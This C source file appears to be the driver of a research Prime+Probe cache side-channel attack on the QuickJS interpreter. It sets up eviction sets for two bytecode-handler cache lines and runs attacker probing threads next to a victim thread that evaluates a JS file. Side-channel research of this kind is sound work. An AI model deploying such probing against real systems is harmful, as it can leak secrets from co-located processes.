#include "arch.h"
#include "config.h"
#include "log.h"
#include "prime_probe.h"
#include "cache/cache_param.h"
#include "quickjs_runtime.h"
#include "dsp.h"
#include "shared_memory.h"

#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <math.h>
#include <pthread.h>
#include <semaphore.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <unistd.h>
#include <x86intrin.h>

static uint64_t victim_runs = 1;
static const char *test_name = "quickjs_jpeg_js";
static char *js_eval_file;

static enum { cache_line_count = 2, profile_samples = 1 << 20 };
static const uint64_t max_exec_cycles = (uint64_t)4e9;
static uint64_t probe_time_arr[cache_line_count][profile_samples];
static uint64_t sample_tsc_arr[cache_line_count][profile_samples];
static uint64_t *sample_tsc[cache_line_count];
static uint64_t *probe_time[cache_line_count];

static pthread_barrier_t attacker_threads_barrier;

int main(int argc, char **argv) {
	if (argc < 2) {
		log_info("usage: %s <js-file>\n", argv[0]);
		return 1;
	}

	js_eval_file = argv[1];

	pthread_t thread0 = 0, thread1 = 0, thread2 = 0, thread3 = 0;
	int err;

	init_sync_ctx(QUICKJS_PROJ_ID);
	quickjs_get_bytecode_handler_cacheline();

	srand(time(NULL));

	if (cache_env_init(1)) {
		log_error("Failed to initialize cache env!\n");
		return 1;
	}

	for (int i = 0; i < cache_line_count; ++i) {
		sample_tsc[i] = sample_tsc_arr[i];
		probe_time[i] = probe_time_arr[i];
	}

	PP_attacker_thread_config_t pt_goto16 = {
		.label = "goto16",
		.slot = 0,
		.target = (uintptr_t)target_goto16 + CACHE_LINE_SIZE
	};
	PP_thread_config_init(pt_goto16);
	PP_attacker_thread_config_t pt_shl = { .label = "shl",
		                                   .slot = 1,
		                                   .target = (uintptr_t)target_shl +
		                                             1 * CACHE_LINE_SIZE };
	PP_thread_config_init(pt_shl);

	prepare_evset_thres(
	    pt_goto16.target, &pt_goto16.evset, &pt_goto16.threshold);
	prepare_evset_thres(pt_shl.target, &pt_shl.evset, &pt_shl.threshold);
	// quickjs_test_prepare_evset(pt_sub.target, &pt_sub.evset, &pt_sub.threshold);

	if (pt_goto16.evset == NULL || pt_goto16.threshold == 0 ||
	    pt_shl.evset == NULL || pt_shl.threshold == 0) {
		log_error("Cannot build evset for goto16, shl and sub");
		return 1;
	} else {
		log_info("Build evset for goto16, shl and sub ");
	}

	quickjs_runtime_thread_config_t vt_config = {
		js_eval_file,
		victim_runs,
		// pinned_cpu0,
		-1,
	};

	if (pthread_barrier_init(&attacker_threads_barrier, NULL, 2) != 0) {
		log_error("Error initializing barrier\n");
		return -1;
	}

	err = pthread_create(&thread0, NULL, quickjs_runtime_thread, &vt_config);
	if (err != 0)
		log_error("can't create thread0 :[%s]", strerror(err));

	err = pthread_create(&thread1, NULL, PP_attacker_thread, &pt_goto16);
	if (err != 0)
		log_error("can't create thread1 :[%s]", strerror(err));

	err = pthread_create(&thread2, NULL, PP_attacker_thread, &pt_shl);
	if (err != 0)
		log_error("can't create thread2 :[%s]", strerror(err));

	pthread_join(thread0, NULL);
	pthread_join(thread1, NULL);
	pthread_join(thread2, NULL);

	pthread_barrier_destroy(&attacker_threads_barrier);

	return 0;
}
